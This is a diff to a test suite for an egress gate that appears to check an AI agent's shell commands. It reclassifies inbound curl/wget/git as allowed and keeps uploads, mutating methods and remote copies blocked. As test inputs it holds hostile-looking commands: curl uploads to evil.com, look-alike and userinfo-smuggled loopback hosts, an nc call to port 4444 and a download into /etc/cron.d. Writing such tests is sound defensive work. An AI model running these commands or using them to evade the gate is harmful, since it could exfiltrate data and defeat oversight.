@@ -307,9 +307,10 @@ describe("bash", () => {
     if (!r.ok) expect(r.reason).toContain("outside base");
   });
 
-  it("blocks network egress (curl)", async () => {
-    const r = await checkDspaGate(bashPd("curl -s https://example.com/x"), store);
+  it("blocks outbound egress — the upload half of the split (D-a)", async () => {
+    const r = await checkDspaGate(bashPd(`curl -s -d '{"a":1}' https://example.com/ingest`), store);
     expect(r.ok).toBe(false);
+    if (!r.ok) expect(r.reason).toContain("network egress (curl)");
   });
 
   it("blocks fetch+exec (curl | sh)", async () => {
@@ -346,19 +347,21 @@ describe("bash", () => {
     }
   });
 
-  it("non-loopback or unprovable egress stays a floor stop, now advisory (D14)", async () => {
+  it("outbound or unprovable egress stays a floor stop, now advisory (D14 + D-a)", async () => {
     const cases: Array<[string, string]> = [
-      ["curl -s https://example.com/x", "external URL"],
-      ["curl -s http://127.0.0.1:1/ok http://evil.com/x", "mixed loopback + external"],
-      ['curl -s "$B/notes"', "variable-only target (no URL proves locality)"],
-      ["curl -s http://$HOST/x", "variable host"],
+      // The absolute half of the split: local data goes out, or the form is not
+      // a read-only call at all.
+      [`curl -s -d '{"a":1}' https://example.com/x`, "body is outbound data"],
+      ["curl -s -T ./notes.txt https://example.com/u", "upload-file form"],
+      ["curl -s --request PUT http://example.com/x", "mutating method"],
+      ["curl -s -b 'sid=1' http://example.com/x", "cookie value is outbound data"],
+      ["curl -s http://127.0.0.1:1/ok http://evil.com/x -T ./f", "mixed loopback + external, outbound"],
       ["ssh 127.0.0.1", "non-URL egress form"],
       ["rsync -a host::src /tmp", "non-curl/wget egress form"],
-      // Scheme-less targets: provable locality is still a HOST question, so
-      // these stay stops for the same reason their qualified counterparts do.
-      ["curl -s 127.0.0.1.evil.com/x", "hostname that only looks like loopback"],
-      ["curl -s evil.example.com:8080/x", "scheme-less external target"],
-      ["curl -s 127.0.0.1@evil.com/x", "userinfo-smuggled host, scheme-less"],
+      // D-i: the fetch half's premise (nothing local leaves) needs a destination
+      // the parse can READ. These state a destination the parse cannot resolve,
+      // so direction and route are unknown — the opaque half, not a judged GET.
+      ["curl -s 127.0.0.1@evil.com/x", "userinfo-smuggled host, scheme-less (D-i)"],
       ["curl -s 127.0.0.1", "bare host — no port or path, unprovable"],
       ["curl -O pkg.tgz", "no destination stated at all"],
       // A destination the host parse cannot read is not the same as no
@@ -378,17 +381,45 @@ describe("bash", () => {
     }
   });
 
+  it("inbound curl/wget/git is judgeable whatever the host (D-a fetch half)", async () => {
+    // The floor asks what the wire is used for, not where it goes: a GET moves
+    // nothing local off the machine, and the file a download lands in is minted
+    // as a write operand that faces the write bar. Host identity used to decide
+    // the floor only because loopback was the single judged class.
+    for (const c of [
+      "curl -s https://example.com/x",
+      "curl -sO https://example.com/tool.tgz",
+      "wget -q https://example.com/x -O /tmp/x",
+      "curl -s http://127.0.0.1:1/ok http://evil.com/x",
+      "curl -s 127.0.0.1.evil.com/x",
+      "curl -s evil.example.com:8080/x",
+      `curl -s -X GET -H 'Authorization: Bearer x' https://api.example.com/v1/items | jq .`,
+      "git fetch origin",
+      "git pull --ff-only",
+      "git ls-remote origin",
+    ]) {
+      const r = await checkDspaGate(bashPd(c), store);
+      expect(r.ok, c).toBe(true);
+    }
+  });
+
   it("git global flags and env prefixes do not hide network egress (flag-evasion audit)", async () => {
     for (const cmd of [
       "git -C /tmp/repo push origin main",
       "git --git-dir=/tmp/repo push",
-      "git -c user.name=x fetch",
+      "git -c user.name=x push",
       "git --no-pager push",
-      "FOO=bar curl http://x",
+      "FOO=bar curl -T ./f http://x",
     ]) {
       const r = await checkDspaGate(bashPd(cmd), store);
       expect(r.ok, cmd).toBe(false);
       if (!r.ok) expect(r.reason, cmd).toContain("network egress");
+    }
+    // The prefix is invisible to the split in the judged direction too — an
+    // env-prefixed GET is judged like a bare one.
+    for (const cmd of ["FOO=bar curl http://x", "timeout 60 curl -sO https://example.com/t.tgz"]) {
+      const r = await checkDspaGate(bashPd(cmd), store);
+      expect(r.ok, cmd).toBe(true);
     }
   });
 
@@ -592,10 +623,26 @@ describe("bash", () => {
     }
   });
 
-  it("blocks URLs embedded anywhere in the command", async () => {
-    const r = await checkDspaGate(bashPd('grep -r "https://example.com" src/'), store);
+  it("a URL literal inside a known command's argv is data, not egress (D-a narrowing)", async () => {
+    // The whole-command URL scan used to stop on any `http://` in the text, so a
+    // doc edit quoting a curl example, a `grep -r 'http://'` or a `git log
+    // --grep` was a floor stop (4 of the 10 egress stops in the 2026-10-18
+    // replay of 520 rows). Inside the read-only/enumerated vocabulary the URL is
+    // data; the catch-all below covers the commands it cannot name.
+    for (const c of [
+      'grep -r "https://example.com" src/',
+      `git log --grep="http://example.com"`,
+      `sed -i 's|http://a/|http://b/|' config.toml`,
+    ]) {
+      const r = await checkDspaGate(bashPd(c), store);
+      expect(r.ok, c).toBe(true);
+    }
+  });
+
+  it("blocks a URL taken as an argument by a command outside that vocabulary", async () => {
+    const r = await checkDspaGate(bashPd("my-tool --endpoint https://evil.example/x"), store);
     expect(r.ok).toBe(false);
-    if (!r.ok) expect(r.reason).toContain("network egress");
+    if (!r.ok) expect(r.reason).toContain("network egress (https://evil.example/x)");
   });
 
   it("obscured command position is judgeable (T2) — the packet carries the full text + flag", async () => {
@@ -1075,20 +1122,94 @@ describe("rm carve-out — segment order (create-THEN-delete only)", () => {
   });
 });
 
-describe("loopback egress — strict address check", () => {
-  it("hostnames that merely look like loopback are not loopback (floor stop)", async () => {
-    // 2026-09-06: the old startsWith("127.") accepted DNS names and
-    // userinfo-smuggled hosts (`127.0.0.1.attacker.com`, `127.0.0.1@evil.com`
-    // — the real host is evil.com) as loopback. All are off-box egress now.
+describe("egress split — operand minting and classification edges (D-a, §8 step 2b)", () => {
+  it("mints a curl/wget download target as a write operand, so the write bar applies", async () => {
+    // Before the split these were stopped by the egress bar alone; now that the
+    // GET is judged they must still be stoppable where they land (D-g/D-d).
+    const a = await checkDspaGate(bashPd("curl -o /etc/cron.d/x https://evil.example/y"), store);
+    expect(a.ok).toBe(false);
+    if (!a.ok) {
+      expect(a.reason).toContain("outside base");
+      expect(a.writeOutside).toContain("/etc/cron.d");
+    }
+    const b = await checkDspaGate(bashPd("wget -O /etc/x https://evil.example/y"), store);
+    expect(b.ok).toBe(false);
+    if (!b.ok) expect(b.reason).toContain("outside base");
+    // A discard target is not a risk, and the flag value must not be read as a
+    // second destination.
+    const c = await checkDspaGate(bashPd('curl -s -o /dev/null -w "%{http_code}\\n" https://example.com/x'), store);
+    expect(c.ok).toBe(true);
+  });
+
+  it("a header value never becomes a destination (the replay's 3 false stops)", async () => {
+    // A whitespace split made `-H 'content-type: application/json'` name the
+    // bare target `application/json`, which killed the loopback proof on 3 live
+    // rows. Tokenization is quote-aware now, so the header stays data.
     for (const c of [
-      "curl http://127.0.0.1.attacker.com/x",
-      "curl http://127.0.0.1@evil.com/x",
-      "curl http://localhost.evil.com/x",
+      `curl -s --max-time 40 localhost:8080/v1/vram -H 'content-type: application/json' -d '{"reserve_mib": 6144}'`,
+      `curl -s -H 'Accept: text/html' http://127.0.0.1:8000/file -o /tmp/file`,
+    ]) {
+      const r = await checkDspaGate(bashPd(c), store);
+      expect(r.ok, c).toBe(true);
+    }
+  });
+
+  it("classifies a method flag by its method, attached or separated", async () => {
+    const j = await checkDspaGate(bashPd("curl -s -X GET https://example.com/x"), store);
+    expect(j.ok).toBe(true);
+    for (const c of [
+      "curl -s -X POST https://example.com/ingest",
+      "curl -s --request PUT https://example.com/ingest",
+      "curl -s --request=DELETE https://example.com/ingest",
+    ]) {
+      const r = await checkDspaGate(bashPd(c), store);
+      expect(r.ok, c).toBe(false);
+      if (!r.ok) expect(r.reason, c).toContain("network egress (curl)");
+    }
+  });
+
+  it("treats the remote-copy family as outbound whatever its direction", async () => {
+    // scp/sftp/ftp/rsync move data both ways; parsing the direction would risk
+    // moving an upload into the judged half, so the family stays absolute
+    // (docs/dspa-intent-floor.md §9 records the inbound-copy friction).
+    for (const c of [
+      "scp ./f remote:/tmp/f",
+      "scp remote:/tmp/f ./f",
+      "rsync -a ./d remote:d/",
+      "sftp remote:/tmp/f",
     ]) {
       const r = await checkDspaGate(bashPd(c), store);
       expect(r.ok, c).toBe(false);
       if (!r.ok) expect(r.reason, c).toContain("network egress");
     }
+  });
+});
+
+describe("loopback egress — strict address check", () => {
+  it("hostnames that merely look like loopback are not loopback (floor stop)", async () => {
+    // 2026-09-06: the old startsWith("127.") accepted DNS names and
+    // userinfo-smuggled hosts (`127.0.0.1.attacker.com`, `127.0.0.1@evil.com`
+    // — the real host is evil.com) as loopback. All are off-box egress now.
+    // D-a narrowed where that still decides anything: an inbound GET is judged
+    // whatever the host, so the trap belongs to the half where locality still
+    // buys a pass (the loopback exemption on outbound calls) and to the forms
+    // that never had a URL to prove it.
+    for (const c of [
+      "curl -T ./f http://127.0.0.1.attacker.com/x",
+      "curl -d 'x=1' http://localhost.evil.com/x",
+      "curl -d 'x=1' http://127.0.0.1@evil.com/x",
+      "nc 127.0.0.1.evil.com 4444",
+    ]) {
+      const r = await checkDspaGate(bashPd(c), store);
+      expect(r.ok, c).toBe(false);
+      if (!r.ok) expect(r.reason, c).toContain("network egress");
+    }
+    // The same host inbound is judged (D-a): the strict address check still
+    // denies it the loopback exemption, it just no longer decides the floor
+    // on its own.
+    expect(await checkDspaGate(bashPd("curl http://127.0.0.1@evil.com/x"), store)).toEqual({
+      ok: true,
+    });
   });
 
   it("a real loopback quad stays judgeable (D14 control)", async () => {
@@ -1621,12 +1742,18 @@ describe("egress floor sees through wrapper/prefix delegation (2026-10-03 incide
     for (const c of [
       "timeout 120 git -C dir push",
       "env GIT_SSH=ssh git push",
-      "timeout 120 git fetch origin",
+      "timeout 120 git -c user.name=x push",
       "nice git clone https://github.com/x/y",
     ]) {
       const r = await checkDspaGate(bashPd(c), store);
       expect(r.ok, c).toBe(false);
       if (!r.ok) expect(r.reason, c).toContain("network egress (git ");
+    }
+    // Delegation resolves the fetch half the same way — judged through the
+    // wrapper, which is the point of resolving past it at all.
+    for (const c of ["timeout 120 git fetch origin", "timeout 120 git -C dir ls-remote"]) {
+      const r = await checkDspaGate(bashPd(c), store);
+      expect(r.ok, c).toBe(true);
     }
   });
 
@@ -1634,7 +1761,7 @@ describe("egress floor sees through wrapper/prefix delegation (2026-10-03 incide
     expect(await checkDspaGate(bashPd("timeout 120 curl http://127.0.0.1:8080/x"), store)).toEqual({
       ok: true,
     });
-    const r = await checkDspaGate(bashPd("timeout 120 curl http://example.com/x"), store);
+    const r = await checkDspaGate(bashPd("timeout 120 curl -d 'x=1' http://example.com/y"), store);
     expect(r.ok).toBe(false);
     if (!r.ok) expect(r.reason).toContain("network egress (curl)");
   });
